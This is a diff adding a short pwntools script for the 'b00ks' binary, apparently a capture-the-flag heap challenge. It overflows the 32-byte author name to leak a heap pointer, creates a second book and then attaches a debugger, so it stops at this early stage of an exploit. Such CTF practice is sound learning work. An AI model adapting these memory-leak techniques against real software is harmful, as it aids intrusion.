@@ -1,0 +1,40 @@
+from pwn import *
+io=process('./b00ks')
+io.recvuntil(b'Enter author name:')
+io.sendline(b'a' * 32)
+
+io.recvuntil(b'>')
+io.sendline(b'1')
+io.recvuntil(b'Enter book name size:')
+io.sendline(b'32')
+io.recvuntil(b'Enter book name (Max 32 chars):')
+io.sendline(b'object1')
+io.recvuntil(b'Enter book description size:')
+io.sendline(b'32')
+io.recvuntil(b'Enter book description:')
+io.sendline(b'object1')
+
+io.recvuntil(b'>')
+io.sendline(b'4')
+io.recvuntil(b'Author:')
+io.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
+book1_addr = io.recv(6)
+book1_addr = book1_addr.ljust(8,b'\x00')
+book1_addr = u64(book1_addr)
+print(hex(book1_addr))
+
+io.recvuntil(b'>')
+io.sendline(b'1')
+io.recvuntil(b'Enter book name size:')
+io.sendline(b'32')
+io.recvuntil(b'Enter book name (Max 32 chars):')
+io.sendline(b'object2')
+io.recvuntil(b'Enter book description size:')
+io.sendline(b'32')
+io.recvuntil(b'Enter book description:')
+io.sendline(b'object2')
+
+gdb.attach(io)
+io.interactive()
+
+
